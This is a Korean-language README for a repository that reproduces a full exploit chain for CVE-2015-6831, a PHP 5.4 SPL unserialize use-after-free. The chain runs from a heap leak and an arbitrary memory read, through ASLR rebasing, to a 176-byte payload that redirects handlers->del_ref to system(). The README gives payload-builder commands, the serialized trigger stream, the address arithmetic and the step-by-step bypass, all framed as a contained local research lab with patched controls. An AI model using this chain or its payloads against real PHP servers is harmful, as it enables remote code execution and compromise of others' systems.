# PHP 5.4 SPL UAF: heap leak, arbitrary read, ASLR rebase, 176바이트 RCE

[English](README.md) · [전체 ASLR 체인](ASLR_CHAIN.md) · [출처](SOURCES.md) · [증거](evidence/README.md)

이 저장소는 **CVE-2015-6831**의 빌드 고정 전체 코드 실행 체인을 재현한다.

```text
SplObjectStorage heap leak
  -> ArrayObject arbitrary read
  -> PHP/libc/loader/libpthread ASLR rebase
  -> __libc_system GOT 슬롯 검증
  -> 176바이트 ArrayObject handlers->del_ref payload
  -> system(">/x/<random>")
```

통합 ASLR 케이스는 모든 런타임 베이스를 exploit 응답만으로 계산한다.
`/proc/<pid>/maps`와 `/proc/<pid>/mem`을 주소 획득에 사용하지 않는다. 동일한
고정 이미지에서 직접 CGI/FPM 메커니즘 대조군과 공식 소스로 빌드한 PHP 5.4.44
수정 버전 대조군도 함께 실행한다.

> 컨테이너는 의도적으로 취약한 로컬 연구 환경이며 호스트 포트를 공개하지
> 않는다. 실행 후 자동 제거된다. 자세한 실행 범위는 [SECURITY.md](SECURITY.md)를
> 참고한다.

## 재현 케이스

| 케이스 | 검증 결과 |
|---|---|
| 전체 ASLR→RCE 체인 | 101바이트 heap leak, 176바이트 arbitrary read, PHP/libc/loader/pthread 베이스와 Build ID, system GOT, 마커 생성, worker 교체 |
| 취약 PHP 5.4.16 CGI | 176바이트 payload로 무작위 마커 생성 |
| 무효 handler 대조군 | UAF dispatch에서 crash, 마커 없음 |
| PHP 5.4.44 수정 대조군 | 정상 `rows=1`, crash와 마커 없음 |
| 취약 PHP 5.4.16 FPM | 마커 생성, 연결 reset, worker 종료·교체 |

전체 ASLR 체인이 주 재현이다. 직접 CGI/FPM 케이스는 메모리 손상과
`del_ref` dispatch를 별도로 확인하는 대조군이며, 여기서 사용하는 호스트 프로세스
검사 결과는 전체 체인의 주소 입력으로 전달되지 않는다.

## 한 번에 재현

요구사항은 Linux amd64, Podman, Python 3.10+이다. 첫 이미지 빌드에는 고정
CentOS archive와 PHP museum 접근이 필요하다.

```bash
python3 lab/centos7/reproduce.py --build --evidence evidence
```

다섯 케이스가 모두 성공하면 프로세스는 0으로 끝나고
`"all_success": true`를 출력한다. 컨테이너, 임시 payload, 무작위 마커 디렉터리는
실행 후 제거된다.

정적 테스트만 실행하려면:

```bash
python3 -m unittest discover -s tests -v
```

## Payload builder

공개 builder에는 최종 exec뿐 아니라 leak과 read가 모두 포함되어 있다.

```bash
# 101바이트 SplObjectStorage heap pointer leak
python3 poc/build_payload.py --mode heap-leak --out heap-leak.bin

# 176바이트 ArrayObject arbitrary read
python3 poc/build_payload.py --mode read \
  --address 0x7f0000000000 --length 256 --out read.bin

# 176바이트 del_ref 실행 payload
python3 poc/build_payload.py --mode exec \
  --pthread-base 0x7f0000000000 \
  --got-offset 0x217088 \
  --cmd '>/tmp/R' --out exec.bin
```

위 주소는 builder 사용 예시일 뿐이다. 통합 케이스는 매 실행마다 101바이트
leak부터 시작해 실제 주소를 새로 계산한다.

## ASLR 우회 경로

구현은 [`verify_aslr_chain.py`](lab/centos7/verify_aslr_chain.py), 단계별 설명은
[ASLR_CHAIN.md](ASLR_CHAIN.md)에 있다.

1. 101바이트 `SplObjectStorage` 본문으로 decimal heap pointer를 얻는다.
2. 176바이트 `ArrayObject` `IS_STRING` payload로 해당 heap의 4096바이트를 읽는다.
3. heap 안의 `_zval_ptr_dtor` 포인터에서 PHP PIE base를 계산한다.
4. PHP ELF magic과 Build ID를 arbitrary read로 확인한다.
5. PHP `iconv@GOT`에서 libc base를 계산하고 ELF/Build ID를 확인한다.
6. PHP `DT_DEBUG`에서 loader base를 계산하고 ELF/Build ID를 확인한다.
7. `_rtld_global+0xf00`의 `pthread_mutex_lock` 포인터에서 libpthread base를
   계산하고 ELF/Build ID를 확인한다.
8. `pthread+0x217088` 슬롯 값이 `libc+system`과 같은지 읽어서 확인한다.
9. 확인된 슬롯으로 176바이트 `handlers->del_ref` payload를 만들고 실행한다.

고정된 해시·Build ID·offset은
[`rebase_profile.json`](lab/centos7/rebase_profile.json)에 명시되어 있다. 어느
단계에서든 응답 길이, ELF, Build ID, 정렬, GOT 값이 다르면 최종 실행 payload를
보내기 전에 중단한다.

로컬 fixture는 arbitrary-read 결과를 hex로 출력하므로 특정 웹 페이지, HTML 표,
URL, query parameter, 문자 인코딩에 의존하지 않는다. UTF-8 replacement가 생기는
출력 sink용 후보 복원 로직은 [`lossy_utf8.py`](poc/lossy_utf8.py)에 일반화해
보존했다.

## 취약점 구성

전체 체인은 역할이 다른 두 SPL unserialize 문제를 결합한다.

| 단계 | PHP 버그 | 역할 |
|---|---|---|
| heap bootstrap | #70168 `SplObjectStorage` | 최초 mapped heap pointer 누출 |
| arbitrary read와 최종 dispatch | #70155/#70166 `ArrayObject` | 해제된 24바이트 zval을 `IS_STRING` 또는 `IS_OBJECT`로 재사용 |

둘 다 CVE-2015-6831 계열에 포함된다. #70166 직접 수정은
`7381b6accc5559b2de039af3a22f6ec1003b03b3`, #70168 수정은
`c2e197e4efc663ca55f393bf0e799848842286f3`이다. #70068/CVE-2015-6832는
이 체인에서 사용하지 않는 별도 `ArrayObject` items dangling-pointer다. 원 보고와
커밋은 [SOURCES.md](SOURCES.md)에 정리했다.

## 176바이트 `ArrayObject` primitive

공통 내부 스트림은 다음과 같다.

```text
x:i:0;O:12:"DateInterval":1:{s:1:"y";R:5;};m:a:1:{i:0;R:4;}
```

`R:5`는 `DateInterval` 자기참조고, `R:4`는 취약한 unserialize 참조 테이블에
남은 임시 `pflags` zval에 도달한다. 뒤의 24바이트 문자열 할당이 해제된 zval
자리를 공격자 바이트로 채운다.

- read 형식은 address와 length가 들어간 `IS_STRING` zval이다.
- exec 형식은 inline command, 가짜 handler pointer, `refcount=1`이 들어간
  `IS_OBJECT` zval이다.

소멸 경로는 `handlers->del_ref(zval *)`를 호출한다. AMD64 ABI에서 zval 주소가
첫 인자이므로 `del_ref`를 `system()`으로 연결하면 zval 첫 qword의 명령이 실행된다.

```text
handlers = resolved_system_GOT_slot_address - 8
```

inline 슬롯은 NUL을 포함해 8바이트라 명령은 ASCII 1–7바이트다. `system()` 반환
후 worker가 crash할 수 있으므로 응답 단절이 아니라 마커 생성과 worker 교체를
실행 증거로 사용한다.

## 고정 빌드 범위

이 저장소는 제공된 profile의 전체 체인이며 PHP 전 버전에 통용되는 exploit은 아니다.

- x86-64 little-endian, non-ZTS PHP 5.4, 24바이트 zval
- `php-fpm-5.4.16-48.el7`
- `glibc-2.17-317.el7`
- 고정된 바이너리 해시, Build ID, symbol offset, relocation 검증
- 로컬 lossless output fixture
- 7바이트 inline command 제한

재사용할 절대 ASLR 주소는 저장하지 않는다. 각 실행은 fresh heap leak부터 모든
베이스를 다시 계산한다.

## 증거

커밋된 증거는 다섯 케이스의 한 번의 전체 실행 스냅샷이다. `aslr-chain/`에는
101바이트 leak 본문, 최종 176바이트 trigger, 요청별 trace, 계산된 주소와 검증
결과가 들어간다. PID, ASLR base, 무작위 marker와 동적 payload 해시는 실행마다
달라진다. 자세한 형식은 [evidence/README.md](evidence/README.md)에 있다.

## 라이선스

저장소에서 작성한 코드와 문서는 [MIT License](LICENSE)로 배포한다. 공식
배포처에서 내려받는 PHP 소스와 vendor package는 각자의 라이선스를 따른다.
